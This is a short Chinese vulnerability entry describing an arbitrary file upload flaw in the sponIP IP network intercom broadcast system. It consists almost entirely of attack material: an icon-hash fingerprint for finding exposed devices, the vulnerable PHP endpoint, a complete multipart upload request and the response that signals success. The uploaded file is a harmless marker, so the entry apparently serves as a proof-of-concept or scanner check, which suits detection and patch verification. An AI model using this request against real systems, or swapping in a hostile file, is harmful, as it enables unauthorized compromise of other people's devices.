# sponIP网络对讲广播系统任意文件上传漏洞

sponIP ｜ 文件上传 ｜ —
- **指纹**：`icon_hash="-1700598274"`
- **请求**：`POST /php/addscenedata.php HTTP/1.1`

**Payload**
```
------WebKitFormBoundary4LuoBRpTiVBo9cIQ
Content-Disposition: form-data; name="upload"; filename="dudesuite.txt"
Content-Type: text/plain
dudesuite
------WebKitFormBoundary4LuoBRpTiVBo9cIQ--
```
- **响应特征**：200